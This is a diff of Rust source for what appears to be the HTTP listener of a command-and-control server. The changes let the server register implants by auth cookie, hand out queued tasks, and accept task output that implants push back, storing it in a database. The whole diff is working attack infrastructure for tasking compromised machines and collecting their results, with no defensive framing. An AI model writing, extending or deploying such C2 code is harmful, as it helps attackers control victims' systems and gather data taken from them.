@@ -9,10 +9,10 @@ use std::io;
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream};
 
-use crate::models::{ListenerSignal, ImplantTaskStatus, ListenerStatus, ImplantConnectionType};
+use crate::models::{ListenerSignal, ImplantTaskStatus, ListenerStatus, ImplantConnectionType, ImplantTask};
 use crate::settings;
+use crate::misc;
 use crate::database;
-use crate::utils;
 
 lazy_static!
 {
@@ -140,7 +140,15 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
 
     let http_response_bytes: Vec<u8> = if is_implant
     {
-        prepare_http_response_implant(listener_id, implant_connection_type, implant_auth_cookie)
+        let http_request_body_offset: Status<usize> = res.unwrap();
+        let http_request_body_bytes: &[u8] = &http_request_bytes[http_request_body_offset.unwrap()..];
+
+        prepare_http_response_implant(
+            listener_id,
+            implant_connection_type,
+            implant_auth_cookie,
+            http_request_body_bytes
+        )
     }
     else
     {
@@ -247,7 +255,7 @@ fn prepare_http_response(
 
         write_http_response_bytes(
             http_response,
-            utils::read_file_bytes(&default_page_path)
+            misc::utils::read_file_bytes(&default_page_path)
         )
     }
     else {
@@ -257,7 +265,7 @@ fn prepare_http_response(
 
         write_http_response_bytes(
             http_response,
-            utils::read_file_bytes(&error_page_path)
+            misc::utils::read_file_bytes(&error_page_path)
         )
     }
 }
@@ -271,18 +279,18 @@ fn prepare_http_response_task_command(task_command: String) -> Vec<u8>
 fn prepare_http_response_implant(
     listener_id: u16,
     implant_connection_type: ImplantConnectionType,
-    implant_auth_cookie: String
+    implant_auth_cookie: String,
+    http_request_body_bytes: &[u8]
 ) -> Vec<u8>
 {
     let mut http_response: Response = httparse::Response::new(&mut []);
     let _http_response_headers: Vec<Header> = Vec::new();
     let mut http_response_body: Vec<u8> = Vec::new();
-    let http_response_bytes: Vec<u8> = Vec::new();
 
     match implant_connection_type
     {
         ImplantConnectionType::Pull => {
-            if ! database::check_if_implant_exists(None, Some(&implant_auth_cookie))
+            if database::check_if_implant_exists(None, Some(&implant_auth_cookie)).is_none()
             {
                 println!("\n[+] Adding to database implant with hash: {}", &implant_auth_cookie);
     
@@ -310,7 +318,7 @@ fn prepare_http_response_implant(
                 let mut include_statuses: Vec<String> = Vec::new();
                 include_statuses.push(ImplantTaskStatus::Issued.to_string());
     
-                let implant_tasks = database::get_implant_tasks("CookieHash", &implant_auth_cookie, include_statuses);
+                let implant_tasks: Vec<ImplantTask> = database::get_implant_tasks("CookieHash", &implant_auth_cookie, include_statuses);
 
                 if implant_tasks.len() == 0
                 {
@@ -360,11 +368,42 @@ fn prepare_http_response_implant(
             
         },
         ImplantConnectionType::Push => {
+            let implant_id = database::check_if_implant_exists(
+                None,
+                Some(&implant_auth_cookie)
+            );
 
+            if implant_id.is_none()
+            {
+                http_response.code = Some(404);
+                http_response.version = Some(1);
+                http_response.reason = Some("Not Found");
+
+                return write_http_response_bytes(http_response, http_response_body);
+            }
+
+            if http_request_body_bytes.len() > 0
+            {
+                if database::update_implant_task_output(
+                    implant_id.unwrap(),
+                    http_request_body_bytes
+                )
+                {
+                    http_response.code = Some(200);
+                    http_response.version = Some(1);
+                    http_response.reason = Some("OK");
+                }
+                else
+                {
+                    http_response.code = Some(404);
+                    http_response.version = Some(1);
+                    http_response.reason = Some("Not Found");
+                }
+            }
+
+            return write_http_response_bytes(http_response, http_response_body);
         }
     }
-
-    return http_response_bytes;
 }
 
 // https://github.com/vi/http-bytes/blob/master/src/lib.rs
